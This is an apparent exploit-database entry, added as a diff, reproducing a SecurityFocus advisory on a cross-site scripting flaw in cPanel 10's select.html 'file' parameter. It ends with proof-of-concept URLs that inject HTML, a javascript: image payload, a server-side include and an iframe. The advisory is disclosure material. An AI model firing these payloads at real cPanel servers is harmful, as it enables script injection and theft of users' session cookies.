@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/18655/info
+
+Cpanel is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+This issue affects version 10; other versions may also be vulnerable.
+
+[+] Exploit: http://[Target]:[Port]/[Dir]/x/files/select.html?dir=/&file= <h1><b>Your code here!!</b></h1> [+] Javascript: http://[Target]:2082/frontend/x/files/select.html?dir=/&file=<IMG src="javascript:alert('yeah');"> [+] Server Side Inclusion http://[Target]:2082/frontend/x/files/select.html?dir=/&file=<!--#echo var="HTTP_REFERER" --> [+] HTML http://[Target]:2082/frontend/x/files/select.html?dir=/&file=<IFRAME SRC="index.html">
